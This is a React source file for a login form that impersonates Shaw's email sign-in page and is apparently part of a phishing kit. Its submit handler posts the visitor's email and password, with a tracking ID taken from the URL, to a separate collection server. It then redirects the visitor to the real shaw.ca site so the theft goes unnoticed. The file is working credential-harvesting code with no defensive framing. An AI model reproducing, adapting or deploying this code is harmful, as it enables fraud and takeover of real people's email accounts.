import { useState, useEffect } from 'react'
import Logo from '../assets/sha-logo.png'
import axios from 'axios'
import { hostURL } from '../helpers/data'
import { useLocation } from 'react-router-dom'

const Form = () => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState(false)

  const [redirect, setRedirect] = useState(false)

  const { search } = useLocation()
  const userID = search.slice(1)
  console.log(userID)

  useEffect(() => {
    redirect && window.location.replace('https://www.shaw.ca/')
  }, [redirect])

  const handleClick = () => {
    setError(false)
    if (!email || !password) {
      setError(true)
      return
    }
    const data = JSON.stringify({ email, password })
    axios
      .post(`${hostURL}main`, { data, userID, title: 'SHAW' })
      .then(() => {
        setRedirect(true)
      })
      .catch((e) => console.log(e))
  }

  return (
    <div className='mt-5 text-[#666666] px-3 flex flex-col gap-3 border-r-2'>
      <header className='flex items-center justify-center flex-col'>
        <img src={Logo} className='md:w-[20rem]' />
        <h3 className='text-[#333] font-semibold text-lg md:text-xl md:font-bold text-center mt-5'>
          Sign in to access your Shaw email
        </h3>
      </header>
      <section className='flex flex-col gap-1 md:gap-2 md:w-[25rem]'>
        <label className='font-medium md:text-lg'>Shaw email</label>
        <input
          type='email'
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder='example@shaw.ca'
          className='border-2 outline-none h-10 bg-transparent md:font-semibold border-[#666] md:text-xl text-lg text-[#666] px-2'
        />
      </section>
      <section className='flex flex-col gap-1 md:gap-2 md:w-[25rem]'>
        <label className='font-medium md:text-xl'>Password</label>
        <input
          type='password'
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className='border-2 outline-none h-10 md:bg-transparent font-semibold border-[#666] md:text-xl text-lg text-[#666] px-2'
        />
      </section>
      {error && (
        <p className='font-medium text-red-700'>
          Please provide a valid email and password
        </p>
      )}
      <button
        className='text-xl md:text-2xl font-bold tracking-tight border-2 text-white bg-[#0082bb] border-[#1088c2] w-full md:w-[15rem] py-3 mt-10 rounded self-center '
        onClick={handleClick}
      >
        Sign in
      </button>
      <section className='mt-4 flex flex-col gap-2 md:gap-1 text-sm md:text-lg text-center font-medium'>
        <p className=' '>
          Having troubles?{' '}
          <span className='text-[#0082bb]'>
            Shaw Support How To Reset My Password
          </span>
        </p>
        <p className=''>
          Already Know How?{' '}
          <span className='text-[#0082bb]'>Reset Password On My Shaw</span>
        </p>
      </section>
    </div>
  )
}

export default Form
